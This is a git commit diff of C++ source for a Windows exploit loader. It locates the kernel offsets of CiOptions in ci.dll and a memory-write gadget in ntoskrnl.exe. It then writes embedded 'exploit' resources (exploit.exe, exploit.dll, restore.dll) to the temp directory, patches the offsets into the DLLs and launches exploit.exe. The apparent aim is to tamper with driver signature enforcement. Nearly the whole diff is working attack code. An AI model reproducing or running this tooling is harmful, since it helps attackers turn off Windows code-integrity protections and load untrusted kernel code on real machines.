a14b35a75d1cd2510976951c94b8573614ebeb37
un3ch1 <uniquechl@outlook.com>
2024-05-08 17:21:43 +0800

    make Integrated

--- src/main.cpp
+++ src/main.cpp
@@ -1,11 +1,13 @@
 #include "global.h"
+#include "resource.h"
 
-void FindWriteGadget(_In_ PVOID MappedBase)
+
+ULONG FindWriteGadget(_In_ PVOID MappedBase)
 {
 	const PUCHAR FsRtlInitializeFileLock = reinterpret_cast<PUCHAR>(GetProcedureAddress(reinterpret_cast<ULONG_PTR>(MappedBase), "FsRtlInitializeFileLock"));
 
 	if (FsRtlInitializeFileLock == nullptr)
-		return;
+		return 0;
 
 	// Printf(L"FsRtlInitializeFileLock: %p\n", FsRtlInitializeFileLock);
 
@@ -26,9 +28,10 @@ void FindWriteGadget(_In_ PVOID MappedBase)
 
 	// Printf(L"ntBase:                  %p\n", MappedBase);
 	Printf(L"> Offset asm mov:   %p\n", (mov - MappedBase));
+	return (mov - MappedBase);
 }
 
-void QueryCiOptions(_In_ PVOID MappedBase)
+ULONG QueryCiOptions(_In_ PVOID MappedBase)
 {
 	ULONG c;
 	LONG Rel = 0;
@@ -37,7 +40,7 @@ void QueryCiOptions(_In_ PVOID MappedBase)
 	// Printf(L"CiInitialize:    %p\n", CiInitialize);
 
 	if (CiInitialize == nullptr)
-		return;
+		return 0;
 
 	c = 0;
 	ULONG j = 0;
@@ -74,9 +77,10 @@ void QueryCiOptions(_In_ PVOID MappedBase)
 	// Printf(L"CiBase:          %p\n", MappedBase);
 	// Printf(L"MappedCiOptions: %p\n", MappedCiOptions);
 	Printf(L"> Offset CiOptions: %p\n", (MappedCiOptions - MappedBase));
+	return (MappedCiOptions - MappedBase);
 }
 
-void GetWriteGadgetOffset()
+ULONG GetWriteGadgetOffset()
 {
 	WCHAR Path[MAX_PATH];
 	unsigned char NtoskrnlExe[] = { 'n','t','o','s','k','r','n','l','.','e','x','e', 0x0 }; // "ntoskrnl.exe";
@@ -88,13 +92,14 @@ void GetWriteGadgetOffset()
 	if (!NT_SUCCESS(Status))
 	{
 		Printf(L"Failed to map %ls: %08X\n", Path, Status);
-		return;
+		return 0;
 	}
-	FindWriteGadget(MappedBase);
+	ULONG offset = FindWriteGadget(MappedBase);
 	NtUnmapViewOfSection(NtCurrentProcess, MappedBase);
+	return offset;
 }
 
-void GetCiOptionsOffset()
+ULONG GetCiOptionsOffset()
 {
 	// Map file as SEC_IMAGE
 	WCHAR Path[MAX_PATH];
@@ -107,17 +112,109 @@ void GetCiOptionsOffset()
 	if (!NT_SUCCESS(Status))
 	{
 		Printf(L"Failed to map %ls: %08X\n", Path, Status);
-		return;
+		return 0;
 	}
 
-	QueryCiOptions(MappedBase);
+	ULONG offset = QueryCiOptions(MappedBase);
 	NtUnmapViewOfSection(NtCurrentProcess, MappedBase);
+	return offset;
 }
 
-void main()
-{
+BOOL DropResource(ULONG uResourceId, const char* name, DWORD CiOptionsOffset, DWORD GadgetOffset) {
+	CHAR lpTempPathBuffer[MAX_PATH];
+	DWORD dwRetVal;
+	DWORD dwBytesWritten;
+	BOOL result;
+
+	HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCE(uResourceId), TEXT("exploit"));
+	if (hRsrc == NULL) {
+		return false;
+	}
+
+	DWORD dwSize = SizeofResource(NULL, hRsrc);
+	if (dwSize == NULL) {
+		return false;
+	}
+
+	HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
+	if (hGlobal == NULL) {
+		return false;
+	}
+
+	LPVOID lpRes = LockResource(hGlobal);
+
+	dwRetVal = GetTempPathA(MAX_PATH, lpTempPathBuffer);
+	if (dwRetVal > MAX_PATH || (dwRetVal == 0))
+		return false;
+
+	HANDLE hTempFile = CreateFileA(
+		strcat(lpTempPathBuffer, name),
+		GENERIC_WRITE,
+		0,
+		NULL,
+		CREATE_ALWAYS,
+		FILE_ATTRIBUTE_NORMAL,
+		NULL);
+
+	result = WriteFile(hTempFile,
+		lpRes,
+		dwSize,
+		&dwBytesWritten,
+		NULL);
+
+	if (!strcmp(name, "exploit.dll")) {
+		SetFilePointer(hTempFile, 0x1AC00, NULL, FILE_BEGIN);
+		WriteFile(hTempFile, &CiOptionsOffset, 4, &dwBytesWritten, NULL);
+		WriteFile(hTempFile, &GadgetOffset, 4, &dwBytesWritten, NULL);
+	}
+	if (!strcmp(name, "restore.dll")) {
+		SetFilePointer(hTempFile, 0x1AC00, NULL, FILE_BEGIN);
+		WriteFile(hTempFile, &CiOptionsOffset, 4, &dwBytesWritten, NULL);
+		WriteFile(hTempFile, &GadgetOffset, 4, &dwBytesWritten, NULL);
+
+	}
+	CloseHandle(hTempFile);
+	return result;
+}
+
+void DropFile(DWORD CiOptionsOffset, DWORD GadgetOffset) {
+
+	ULONG resIDs[] = { IDR_EXPLOIT1, IDR_EXPLOIT2, IDR_EXPLOIT3};
+	const char* names[] = { "exploit.exe", "exploit.dll", "restore.dll" };
+
+	for (int i = 0; i < 3; i++) {
+		if (!DropResource(resIDs[i], names[i], CiOptionsOffset, GadgetOffset))
+			ExitProcess(-1);
+	}
+}
+
+int main(int argc, char *argv[]) {
+	DWORD CiOptionsOffset;
+	DWORD GadgetOffset;
+	CHAR lpTempPathBuffer[MAX_PATH];
+
+	STARTUPINFOA si;
+	PROCESS_INFORMATION pi;
 	Printf(L"\n");
-	GetCiOptionsOffset();
+	CiOptionsOffset = GetCiOptionsOffset();
 	Printf(L"\n");
-	GetWriteGadgetOffset();
+	GadgetOffset = GetWriteGadgetOffset();
+	DropFile(CiOptionsOffset, GadgetOffset);
+	GetTempPathA(MAX_PATH, lpTempPathBuffer);
+	char* cmdline = strcat(lpTempPathBuffer, "exploit.exe");
+
+	ZeroMemory(&si, sizeof(si));
+	si.cb = sizeof(si);
+	ZeroMemory(&pi, sizeof(pi));
+	CreateProcessA(NULL,
+		cmdline,
+		NULL,
+		NULL,
+		FALSE,
+		0,
+		NULL,
+		NULL,
+		&si,
+		&pi);
+	return 0;
 }
